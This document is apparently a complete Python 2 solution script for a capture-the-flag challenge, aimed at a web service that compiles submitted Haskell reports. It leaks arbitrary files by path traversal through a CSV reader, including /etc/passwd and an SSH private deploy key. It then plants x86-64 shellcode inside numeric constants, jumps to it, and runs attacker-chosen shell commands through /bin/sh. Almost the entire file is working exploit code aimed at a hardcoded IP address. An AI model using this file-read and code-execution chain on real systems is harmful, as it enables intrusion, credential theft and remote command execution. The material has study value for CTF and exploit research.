# https://github.com/niklasb/ctf-tools/tree/master/pwnlib
from pwnlib import tools as t
import struct
import requests
import random
from HTMLParser import HTMLParser
import sys

s = requests.Session()
url = 'http://78.46.224.94'
#url = 'http://localhost:7777'
def leak(fname):
    code = r'''
(xy :: [(Text,Text)]) <- readCsv "../../../../../../../../../{}\0" "aaaaaaaasdja" "bbbbbbasdj" 0 0

table "a" "b" xy
'''.format(fname)
    r = s.post(url + '/report', data = dict(report=code))
    enc = r.text.split('</thead><tbody><tr><td>')[1].split('</td>')[0]
    return HTMLParser().unescape(enc)

def get_user_id():
    code = r'''
let xy = points [(0,1)]
plot $ do
  dat xy
'''
    r = s.post(url + '/report', data = dict(report=code)).text
    return r.split('src="/tmp/')[1].split('/')[0]

def make_exploit(consts, buf, eip, exepath, actions):
    assert len(buf) == 0x100
    assert len(consts) == 9
    code = open('Exploit.hs').read()
    for i, c in enumerate(consts):
        code = code.replace('{consts[%d]}' % i, '0x%016x' % c)
    code = code.replace('{buf}', '"%s"'% buf)
    code = code.replace('{eip}', '0x%016x' % eip)
    code = code.replace('{exepath}', '"%s"' % exepath)
    code = code.replace('{actions}', actions)
    return code

def make_shellcode(addrs, shpayload, binsh, trap=False):
    sc = ''

    # shellcode
    if trap:
        sc += t.x86_64.assemble('int3')
    else:
        sc += '\x90'
    sc += t.x86_64.assemble("push '-c'")
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble('mov r12, rsp')
    sc += '\x90'*3
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("mov ebx, {}".format(shpayload))
    sc += '\x90'
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("xor eax, eax")
    sc += t.x86_64.assemble("push rax")
    sc += t.x86_64.assemble("push rbx")
    sc += t.x86_64.assemble("push r12")
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("mov ebx, {}".format(binsh))
    sc += '\x90'
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("push rbx")
    sc += t.x86_64.assemble("mov rsi, rsp")
    sc += '\x90\x90'
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("mov rdi, rbx")
    sc += t.x86_64.assemble("push 59")
    sc += t.x86_64.assemble("pop rax")
    assert len(sc) % 6 == 0

    sc += t.x86_64.assemble("xor edx, edx")
    sc += t.x86_64.assemble("syscall")
    # assert len(sc) % 6 == 0

    maxlen = len(addrs)*6 + 2
    assert len(sc) <= maxlen
    sc += '\x90'*(maxlen-len(sc))

    consts = []
    scoff = 0
    for i in range(len(addrs)-1):
        diff = addrs[i+1] - addrs[i]
        assert diff > 8 and diff < 100
        val = 0
        for j in range(6):
            val |= ord(sc[scoff+j]) << (8*j)
        val |= 0xeb << (8*6)
        val |= (diff-8) << (8*7)
        consts.append(val)
        scoff += 6
    consts.append(struct.unpack("<Q", sc[scoff:scoff+8])[0])
    return consts


def pwn(cmd):
    print '[*] getting user id'
    user_id = get_user_id()
    consts = [random.randrange(1<<64) for _ in range(9)]
    buf = 'A'*0x100
    eip = 0x41414141

    print '[*] dumping binary'
    exepath = 'tmp/%s/exe' % user_id
    code = make_exploit(consts, buf, eip, exepath, 'upio copy >> upio foo')
    s.post(url + '/report', data = dict(report=code))

    print '[*] downloading binary'
    exe_url = url + '/' + exepath
    exe = s.get(exe_url).content

    print '[*] building shellcode'
    base = 0x400000
    const_locs = [base + exe.index(struct.pack('<Q', c)) for c in consts]
    buf_loc = base + exe.index(buf)
    # print '\n'.join(hex(c) for c in const_locs)
    # print '========'
    # print hex(buf_loc)

    buf = cmd
    buf += ';#'
    buf += 'A'*(0x100 - len('/bin/sh') - len(buf))
    buf += '/bin/sh'
    consts = make_shellcode(const_locs, buf_loc, buf_loc + 0x100 - len('/bin/sh'))
    eip = const_locs[0]
    print '[*] sending final exploit'
    code = make_exploit(consts, buf, eip, exepath, 'upio foo >> upio copy')
    r = s.post(url + '/report', data = dict(report=code)).text
    return r.split('<div class="row report">')[1].split('<hr')[0]

if sys.argv[1] == 'leak':
    print leak(sys.argv[2])
elif sys.argv[1] == 'test':
    print 'testing passwd leak'
    assert '/bin/bash' in leak('/etc/passwd')
    print 'testing deploy_key leak'
    assert 'OPENSSH PRIVATE KEY' in leak('/deploy_key')
    print 'getting flag'
    flag = pwn('/gibe_flag_plx /flag')
    print 'Flag =', flag
    assert 'S_K_and_I' in flag
    print 'Test successful'
else:
    print pwn(sys.argv[2])
